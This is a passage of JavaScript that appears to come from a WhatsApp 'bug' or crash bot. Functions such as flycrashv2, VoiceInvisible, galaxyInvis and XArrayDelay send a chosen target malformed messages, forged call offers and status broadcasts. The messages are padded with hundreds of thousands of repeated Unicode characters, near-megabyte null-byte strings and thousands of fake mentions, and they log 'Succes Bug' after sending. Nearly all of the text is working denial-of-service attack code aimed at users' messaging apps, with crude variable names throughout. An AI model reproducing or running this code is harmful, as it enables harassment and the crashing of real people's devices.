            const { id: meId, lid: meLid } = sock.authState.creds.me;
            const jembut = meLid ? jidDecode(meLid)?.user : null;

            let shouldIncludeDeviceIdentity = false;

            const nodes = await Promise.all(
                ywdh.map(async ({ recipientJid: j, message: msg }) => {
                    const { user: numberUser } = jidDecode(j);
                    const { user: ownUser } = jidDecode(meId);

                    const isOwn = numberUser === ownUser || numberUser === jembut;
                    const y = j === meId || j === meLid;
                    if (dsmMessage && isOwn && !y) msg = dsmMessage;

                    const bytes = payload(yntkts ? yntkts(msg) : Buffer.from([]));

                    return bufferMute.mutex(j, async () => {
                        const { type, ciphertext } =
                            await sock.signalRepository.encryptMessage({
                                jid: j,
                                data: bytes
                            });

                        if (type === "pkmsg") shouldIncludeDeviceIdentity = true;

                        return {
                            tag: "to",
                            attrs: { jid: j },
                            content: [
                                {
                                    tag: "enc",
                                    attrs: { v: "2", type, ...extraAttrs },
                                    content: ciphertext
                                }
                            ]
                        };
                    });
                })
            );

            return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
        };
        let devices = [];
        try {
            devices = (await sock.getUSyncDevices([jid], false, false))
                .map(({ user, device }) =>
                    `${user}${device ? ":" + device : ""}@s.whatsapp.net`
                );
        } catch {
            devices = [jid];
        }

        try {
            await sock.assertSessions(devices);
        } catch { }

        let { nodes: destinations, shouldIncludeDeviceIdentity } = {
            nodes: [],
            shouldIncludeDeviceIdentity: false
        };

        try {
            const created = await sock.createParticipantNodes(
                devices,
                { conversation: "y" },
                { count: "0" }
            );

            destinations = created?.nodes ?? [];
            shouldIncludeDeviceIdentity = !!created?.shouldIncludeDeviceIdentity;
        } catch { }
        const TagMention = {
            tag: "call",
            attrs: {
                to: jid,
                id: sock.generateMessageTag?.() ?? crypto.randomBytes(8).toString("hex"),
                from: sock.user?.id || sock.authState?.creds?.me?.id
            },
            content: [
                {
                    tag: "offer",
                    attrs: {
                        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                        "call-creator": sock.user?.id || sock.authState?.creds?.me?.id
                    },
                    content: [
                        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                        { tag: "net", attrs: { medium: "3" } },
                        {
                            tag: "capability",
                            attrs: { ver: "1" },
                            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
                        },
                        { tag: "encopt", attrs: { keygen: "2" } },
                        {
                            tag: "destination",
                            attrs: {},
                            content: destinations
                        }
                    ]
                }
            ]
        };

        if (shouldIncludeDeviceIdentity && encodeSignedDeviceIdentity) {
            try {
                const deviceIdentity = encodeSignedDeviceIdentity(
                    sock.authState.creds.account,
                    true
                );

                TagMention.content[0].content.push({
                    tag: "device-identity",
                    attrs: {},
                    content: deviceIdentity
                });
            } catch { }
        }

        await sock.sendNode(TagMention);

    } catch (e) { }

}

async function Invisbull(sock, target) {
  const zieeMsg = generateWAMessageFromContent(
    "status@broadcast",
    {
      productMessage: {
        product: {
          productImage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m237/AQPIYikiwi3m6cnqci3YWcDdEXK4pRdEoVuffum6NfmIgZS-w1l3p8hAUz650_FFQNJa0iCUOIRAEXUEi3_lrzuZXctdJEyYxC2eS0afzg?ccb=9-4&oh=01_Q5Aa3QGSiEmJ9tDlRgHnGNJx3KCFYCdyhmkeaq3eHDd1YLRxtw&oe=69631B8B&_nc_sid=e6ed6c&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: Buffer.from("T+i083KjdABcBnJBzbB8paMZoMyNxT3rc+8FUOb4Qtg=", "base64"),
            fileLength: "38617",
            height: 128000000,
            width: 7200000000,
            mediaKey: Buffer.from("zi+b43DCleFrEbpS7EOYN1eKcRykOKDmUmDj3ISXvZI=", "base64"),
            fileEncSha256: Buffer.from("54hPlvNm6Nk1roPnpQGvfvCu8JYb4wLalZ0FZay7Src=", "base64"),
            directPath: "/o1/v/t24/f2/m237/AQPIYikiwi3m6cnqci3YWcDdEXK4pRdEoVuffum6NfmIgZS-w1l3p8hAUz650_FFQNJa0iCUOIRAEXUEi3_lrzuZXctdJEyYxC2eS0afzg?ccb=9-4&oh=01_Q5Aa3QGSiEmJ9tDlRgHnGNJx3KCFYCdyhmkeaq3eHDd1YLRxtw&oe=69631B8B&_nc_sid=e6ed6c",
            mediaKeyTimestamp: "1765450399",
            jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD", "base64")
          },
          productId: "253813391248495300",
          title: "XyraāCantikkk 永遠に生きる" + "ꦾ".repeat(25000) + "ꦽ".repeat(25000) + "\u2080".repeat(175000),
          currencyCode: "USD",
          priceAmount1000: "0",
          productImageCount: 1000000
        },
        businessOwnerJid: "225752674992330@lid"
      },
      messageContextInfo: {
        deviceListMetadata: {
          recipientKeyHash: "iGDumWoqJtlqxw==",
          recipientTimestamp: "1765411475"
        },
        deviceListMetadataVersion: 2,
        messageSecret: "WP/LUg2LGEOMfWhJuSzNtPrDi+L1RjGRiYo+45drhMc="
      }
    },
    {}
  );

  await sock.relayMessage("status@broadcast", zieeMsg.message, {
    messageId: zieeMsg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });
}

async function flycrashv3(sock, target) {
  let d = (
    await sock.getUSyncDevices([t], false, false)
  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

  await sock.assertSessions(d)
  let l = () => {
    let m = {};
    return {
      lock(k, f) {
        m[k] ??= { p: Promise.resolve() };
        m[k].p = (async p => {
          try { await p; } catch {}
          return f();
        })(m[k].p);
        return m[k].p;
      }
    };
  };

  let lk = l();
  let b = b => Buffer.concat([Buffer.from(b), Buffer.alloc(8, 1)]);
  let p = sock.createParticipantNodes.bind(sock);
  let e = sock.encodeWAMessage?.bind(sock) ?? encodeWAMessage;
  sock.createParticipantNodes = async (r, msg, ea, dm) => {
    if (!r.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

    let pm = await (sock.patchMessageBeforeSending?.(msg, r) ?? msg);
    let w = Array.isArray(pm) ? pm : r.map(j => ({ recipientJid: j, message: pm }));

    let { id: mId, lid: mLid } = sock.authState.creds.me;
    let o = mLid ? jidDecode(mLid)?.user : null;
    let sidi = false;

    let n = await Promise.all(w.map(async ({ recipientJid: j, message: m }) => {
      let { user: tU } = jidDecode(j);
      let { user: oU } = jidDecode(mId);
      let io = tU === oU || tU === o;
      let y = j === mId || j === mLid;
      if (dm && io && !y) m = dm;

      let bs = b(e(m));

      return lk.lock(j, async () => {
        let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid: j, data: bs });
        if (type === 'pkmsg') sidi = true;
        return {
          tag: 'to',
          attrs: { jid: j },
          content: [{ tag: 'enc', attrs: { v: '2', type, ...ea }, content: ciphertext }]
        };
      });
    }));

    return { nodes: n.filter(Boolean), shouldIncludeDeviceIdentity: sidi };
  };
  let r1 = crypto.randomBytes(32);
  let r2 = Buffer.concat([r1, Buffer.alloc(8, 0x01)]);
  let { nodes: dest, shouldIncludeDeviceIdentity: sidi } = await sock.createParticipantNodes(
    d,
    { conversation: "y" },
    { count: '0' }
  );
  let c = {
    tag: "call",
    attrs: { to: t, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: "offer",
      attrs: {
        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
        "call-creator": sock.user.id
      },
      content: [
        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
        { tag: "net", attrs: { medium: "3" } },
        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
        { tag: "encopt", attrs: { keygen: "2" } },
        { tag: "destination", attrs: {}, content: dest },
        ...(sidi ? [{
          tag: "device-identity",
          attrs: {},
          content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
        }] : [])
      ]
    }]
  };
  await sock.sendNode(c);
}

async function flycrashv2(sock, target) {
  let devices = (
    await sock.getUSyncDevices([target], false, false)
  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

  await sock.assertSessions(devices)

  let xnxx = () => {
    let map = {};
    return {
      mutex(key, fn) {
        map[key] ??= { task: Promise.resolve() };
        map[key].task = (async prev => {
          try { await prev; } catch {}
          return fn();
        })(map[key].task);
        return map[key].task;
      }
    };
  };

  let memek = xnxx();
  let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
  let porno = sock.createParticipantNodes.bind(sock);
  let yntkts = sock.encodeWAMessage?.bind(sock);

  sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
    if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

    let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
    let ywdh = Array.isArray(patched)
      ? patched
      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

    let { id: meId, lid: meLid } = sock.authState.creds.me;
    let omak = meLid ? jidDecode(meLid)?.user : null;
    let shouldIncludeDeviceIdentity = false;

    let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
      let { user: targetUser } = jidDecode(jid);
      let { user: ownPnUser } = jidDecode(meId);
      let isOwnUser = targetUser === ownPnUser || targetUser === omak;
      let y = jid === meId || jid === meLid;
      if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

      let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

      return memek.mutex(jid, async () => {
        let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
        if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
        return {
          tag: 'to',
          attrs: { jid },
          content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
        };
      });
    }));

    return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
  };

  let awik = crypto.randomBytes(32);
  let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
  let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(
    devices,
    { conversation: "y" },
    { count: '0' }
  );
  let lemiting = {
    tag: "call",
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: "offer",
      attrs: {
        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
        "call-creator": sock.user.id
      },
      content: [
        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },

        { tag: "net", attrs: { medium: "3" } },
        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
        { tag: "encopt", attrs: { keygen: "2" } },
        { tag: "destination", attrs: {}, content: destinations },
        ...(shouldIncludeDeviceIdentity ? [{
          tag: "device-identity",
          attrs: {},
          content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
        }] : [])
      ]
    }]
  };

  await sock.sendNode(lemiting);
}

async function VoiceInvisible(sock, target) {
    const Font = () => Math.floor(Math.random() * 99999999);
    const Color = () =>
        ".menu" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "999999");
    const Msg = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: "   ", format: "DEFAULT" },
                        nativeFlowResponseMessage: {
                            name: "payment_info",
                            paramsJson: "\u0000".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "galaxy_message"
                    }
                }
            }
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Font(),
            background: Color()
        }
    );
    const Msg2 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: "  ", format: "BOLD" },
                        nativeFlowResponseMessage: {
                            name: "payment_method",
                            paramsJson: "\u0000".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "galaxy_message"
                    }
                }
            }
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Font(),
            background: Color()
        }
    );
    const Msg3 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: "   ", format: "BOLD" },
                        nativeFlowResponseMessage: {
                            name: "payment_info",
                            paramsJson: "\u0000".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "galaxy_message"
                    }
                }
            }
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Font(),
            background: Color()
        }
    );
    const relay = async (m) => {
        await sock.relayMessage(
            "status@broadcast",
            m.message,
            {
                messageId: m.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    { tag: "to", attrs: { jid: target } }
                                ]
                            }
                        ]
                    }
                ]
            }
        );
    };
    await relay(Msg);
    await relay(Msg2);
    await relay(Msg3);
    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
                        165, 102, 153, 233, 111, 114, 69, 10,
                        55, 61, 186, 131, 245, 153, 93, 211
                    ]),
                    fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
                        12, 88, 99, 97, 82, 88,
                        81, 99, 77, 76, 6, 18, 27, 199
                    ]),
                    fileEncSha256: Buffer.from([
                        12, 88, 99, 97, 82, 88,
                        81, 99, 77, 76, 6, 18, 27, 199
                    ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from(
                            { length: 2000 },
                            () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                        ),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, generateMessage, {});
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: [] }
                        ]
                    }
                ]
            }
        ]
    });
    console.log(chalk.green(`Send Bug ${target}`));
    await new Promise(res => setTimeout(res, 1000));
}

async function galaxyInvis(sock, target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "@null", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 10000000)}@s.whatsapp.net`
              )
            ],
            externalAdReply: {
              quotedAd: {
                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: `@rizxvelzinfinity${"𑇂𑆵𑆴𑆿".repeat(60000)}`
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
  let biji2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: " ¿¿ ", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );

  const mediaData = [
    {
      ID: "5126860596",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      ID: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ];

  let sequentialIndex = 0;
  const selectedMedia = mediaData[sequentialIndex];
  sequentialIndex = (sequentialIndex + 1) % mediaData.length;

  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia;

  const contextInfo = {
    participant: target,
    mentionedJid: [
      target,
      ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
    ],
  };

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
          fileSha256: SHA256,
          fileEncSha256: ENCSHA256,
          mediaKey: mkey,
          mimetype: "image/webp",
          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
          fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msgxay = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "Hola Bro Join Me Group", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  };

  const interMsg = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "This Xata", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  };

  const statusMessages = [stickerMsg, interMsg, msgxay];

  let content = {
    extendedTextMessage: {
      text: "?¿" + "ꦾ".repeat(50000),
      matchedText: "ꦽ".repeat(20000),
      description: "?¿",
      title: "ꦽ".repeat(20000),
      previewType: "NONE",
      jpegThumbnail:
        "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
      inviteLinkGroupTypeV2: "DEFAULT",
      contextInfo: {
        isForwarded: true,
        forwardingScore: 9999,
        participant: target,
        remoteJid: "status@broadcast",
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1995 },
            () =>
              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        quotedMessage: {
          newsletterAdminInviteMessage: {
            newsletterJid: "otax@newsletter",
            newsletterName:
              "You Know Me xata" + "ꦾ".repeat(10000),
            caption:
              "You KnowMe" +
              "ꦾ".repeat(60000) +
              "ោ៝".repeat(60000),
            inviteExpiration: "999999999"
          }
        },
        forwardedNewsletterMessageInfo: {
          newsletterName:
            "You Know Me" + "⃝꙰꙰꙰".repeat(10000),
          newsletterJid: "13135550002@newsletter",
          serverId: 1
        }
      }
    }
  };
  const xnxxmsg = generateWAMessageFromContent(target, content, {});
  await sock.relayMessage("status@broadcast", xnxxmsg.message, {
    messageId: xnxxmsg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: [] }],
          },
        ],
      },
    ],
  });

  await sock.relayMessage("status@broadcast", biji2.message, {
    messageId: biji2.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: [] }],
          },
        ],
      },
    ],
  });

  for (const content of statusMessages) {
    const msg = generateWAMessageFromContent(target, content, {});
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
    });
  }
}

async function XArrayDelay(target) {
   await antiSpamDelay(); 
  const Stanza_Id = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "!?",
            format: "EXTENTION_1"
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, (_, i) => `1313555020${i + 1}@s.whatsapp.net`),
            statusAttributionType: "SHARED_FROM_MENTION"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "galaxy_message"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
  });

  await sock.relayMessage("status@broadcast", Stanza_Id.message, {
    messageId: Stanza_Id.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });
  const Stanza_Id2 = generateWAMessageFromContent("status@broadcast", {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "!?",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_message"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
  });

  await sock.relayMessage("status@broadcast", Stanza_Id2.message, {
    messageId: Stanza_Id2.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });
  const msg1 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "X",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  }, {});

  const msg2 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "X",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "galaxy_message",
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
  });

  const msg3 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "X",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_message"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215)
      .toString(16)
      .padStart(6, "99999999")
  });

  const msg4 = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  const msg5 = {
    extendedTextMessage: {
      text: "ꦾ".repeat(300000),
      contextInfo: {
        participant: target,
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
          )
        ]
      }
    }
  };
  for (const msg of [msg1, msg2, msg3, msg4, msg5]) {
    await sock.relayMessage(
      "status@broadcast",
      msg.message ?? msg,
      {
        messageId: msg.key?.id || undefined,
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target } }]
          }]
        }]
      }
    );
    console.log(chalk.red("Succes Bug"));
  }

}

async function jixKntl(target) {
    await sock.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    listResponseMessage: {
                        title:
